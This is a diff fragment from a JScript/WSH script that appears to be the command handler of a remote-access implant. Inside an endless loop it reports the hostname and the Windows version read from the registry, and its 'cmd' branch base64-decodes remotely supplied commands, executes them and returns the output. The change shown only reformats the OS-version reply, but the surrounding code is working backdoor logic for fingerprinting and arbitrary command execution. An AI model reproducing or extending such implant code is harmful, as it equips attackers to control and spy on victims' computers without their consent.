@@ -77,7 +77,8 @@ while (true) {
                 result = '["' + hostname + '","' + hostname + '"]';
             }
             if ('os' === name) {
-                result = '"' + b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber")) + '"';
+                os =  b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber"));
+                result = '["' + os + '","' + os + '"]';
             }
             if ('cmd' === name) {
                 result = '"' + cmd(b64d(args[0])) + '"';
